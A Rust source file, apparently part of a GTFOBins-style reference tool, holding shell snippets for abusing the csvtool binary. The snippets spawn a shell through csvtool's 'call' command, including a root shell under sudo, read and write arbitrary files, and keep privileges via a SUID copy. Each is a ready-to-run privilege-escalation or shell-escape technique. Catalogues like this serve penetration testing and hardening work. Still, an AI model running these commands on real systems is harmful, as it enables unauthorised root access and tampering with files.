
pub static BIN_NAME: &'static str = "csvtool";
pub static SH_CODE: &'static str = r#"
    
    csvtool call '/bin/sh;false' /etc/passwd
"#;
pub static FW_DESC: &'static str = "The file is actually parsed and manipulated as CSV, so this might not be suitable for arbitrary data.";
pub static FW_CODE: &'static str = r#"
    
    LFILE=file_to_write
    TF=$(mktemp)
    echo DATA > $TF
    csvtool trim t $TF -o $LFILE
"#;
pub static FR_DESC: &'static str = "The file is actually parsed and manipulated as CSV, so this might not be suitable for arbitrary data.";
pub static FR_CODE: &'static str = r#"
    
    LFILE=file_to_read
    csvtool trim t $LFILE
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which csvtool) .

    LFILE=file_to_read
    ./csvtool trim t $LFILE
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo csvtool call '/bin/sh;false' /etc/passwd
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static FW: Code<'static> = Code { 
	title: "FW_CODE",
	code: FW_CODE,
	tag: Tag::FW,
};
pub static FR: Code<'static> = Code { 
	title: "FR_CODE",
	code: FR_CODE,
	tag: Tag::FR,
};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
